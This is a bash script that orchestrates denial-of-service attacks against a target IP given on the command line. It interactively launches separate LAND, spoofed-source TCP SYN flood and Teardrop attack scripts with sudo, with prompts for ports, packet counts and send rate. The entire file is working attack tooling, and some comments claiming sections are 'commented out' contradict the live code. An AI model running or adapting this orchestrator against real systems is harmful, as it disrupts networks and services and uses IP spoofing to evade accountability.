#!/bin/bash

# Script to orchestrate and run various DoS attacks sequentially.
# All attack scripts are expected to be in the same directory as this script.

# --- Configuration ---
LAND_ATTACK_SCRIPT="./land_attack.py"
SYN_FLOOD_SCRIPT="./syn_flood.py"
TEARDROP_ATTACK_SCRIPT="./teardrop_attack.py"

# --- Helper Functions ---
ask_yes_no() {
    while true; do
        read -p "$1 (yes/no): " yn
        case $yn in
            [Yy]* ) return 0;;  # Yes
            [Nn]* ) return 1;;  # No
            * ) echo "Please answer yes or no.";;
        esac
    done
}

# --- Main Script ---
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip>"
    echo "Example: $0 192.168.1.100"
    exit 1
fi

TARGET_IP="$1"

echo "-------------------------------------"
echo "DoS Attack Orchestrator"
echo "-------------------------------------"
echo "Target IP: $TARGET_IP"
echo "Note: Attack scripts will be run with sudo."


# --- Land Attack ONLY for Debugging ---
if ask_yes_no "Do you want to launch the LAND Attack?"; then
    read -p "Enter target port for LAND Attack (e.g., 139): " LAND_TARGET_PORT
    if [[ ! "$LAND_TARGET_PORT" =~ ^[0-9]+$ ]] || [ "$LAND_TARGET_PORT" -lt 1 ] || [ "$LAND_TARGET_PORT" -gt 65535 ]; then
        echo "Invalid port number. Skipping LAND Attack."
    else
        read -p "Enter number of LAND packets to send (e.g., 10, default: 1): " LAND_PACKET_COUNT
        if [[ -z "$LAND_PACKET_COUNT" ]]; then
            LAND_PACKET_COUNT=1 # Default to 1 if empty
        fi
        if [[ ! "$LAND_PACKET_COUNT" =~ ^[0-9]+$ ]] || [ "$LAND_PACKET_COUNT" -le 0 ]; then
            echo "Invalid packet count. Using default (1)."
            LAND_PACKET_COUNT=1
        fi
        echo "[+] Launching LAND Attack on $TARGET_IP:$LAND_TARGET_PORT with $LAND_PACKET_COUNT packet(s)..."
        COMMAND_TO_RUN="sudo python3 $LAND_ATTACK_SCRIPT $TARGET_IP $LAND_TARGET_PORT --count $LAND_PACKET_COUNT"
        echo "[DEBUG] Executing: $COMMAND_TO_RUN"
        $COMMAND_TO_RUN
        echo "[+] LAND Attack script finished."
    fi
    echo "-------------------------------------"
else
    echo "LAND Attack skipped by user."
fi

# --- TCP SYN Flood Attack (Commented out for debugging) ---
if ask_yes_no "Do you want to launch the TCP SYN Flood Attack?"; then
    read -p "Enter target port for SYN Flood (e.g., 80): " SYN_TARGET_PORT
    if [[ ! "$SYN_TARGET_PORT" =~ ^[0-9]+$ ]] || [ "$SYN_TARGET_PORT" -lt 1 ] || [ "$SYN_TARGET_PORT" -gt 65535 ]; then
        echo "Invalid port number. Skipping SYN Flood Attack."
    else
        read -p "Enter number of SYN packets to send (e.g., 1000): " SYN_NUM_PACKETS
        if [[ ! "$SYN_NUM_PACKETS" =~ ^[0-9]+$ ]] || [ "$SYN_NUM_PACKETS" -le 0 ]; then
            echo "Invalid number of packets. Skipping SYN Flood Attack."
        else
            SPOOF_OPTION=""
            if ask_yes_no "Spoof source IP addresses for SYN Flood? (recommended)"; then
                SPOOF_OPTION="" # Default behavior of syn_flood.py is to spoof
            else
                SPOOF_OPTION="--no_spoof"
            fi
            read -p "Enter send rate (interval in seconds, e.g., 0.01 for 100pps): " SYN_SEND_RATE
            if ! [[ "$SYN_SEND_RATE" =~ ^[0-9]*\.?[0-9]+$ ]] || (( $(echo "$SYN_SEND_RATE < 0" | bc -l) )); then
                echo "Invalid send rate. Skipping SYN Flood Attack."
            else
                echo "[+] Launching TCP SYN Flood on $TARGET_IP:$SYN_TARGET_PORT..."
                sudo python3 "$SYN_FLOOD_SCRIPT" "$TARGET_IP" "$SYN_TARGET_PORT" "$SYN_NUM_PACKETS" $SPOOF_OPTION --rate "$SYN_SEND_RATE"
                echo "[+] TCP SYN Flood Attack script finished."
            fi
        fi
    fi
    echo "-------------------------------------"
fi

# --- Teardrop Attack (Commented out for debugging) ---
if ask_yes_no "Do you want to launch the Teardrop Attack?"; then
    read -p "Enter number of Teardrop packet pairs to send (e.g., 100): " TEARDROP_COUNT
    if [[ ! "$TEARDROP_COUNT" =~ ^[0-9]+$ ]] || [ "$TEARDROP_COUNT" -le 0 ]; then
        echo "Invalid count. Skipping Teardrop Attack."
    else
        echo "[+] Launching Teardrop Attack on $TARGET_IP..."
        sudo python3 "$TEARDROP_ATTACK_SCRIPT" "$TARGET_IP" "$TEARDROP_COUNT"
        echo "[+] Teardrop Attack script finished."
    fi
    echo "-------------------------------------"
fi

echo "All configured attacks finished."
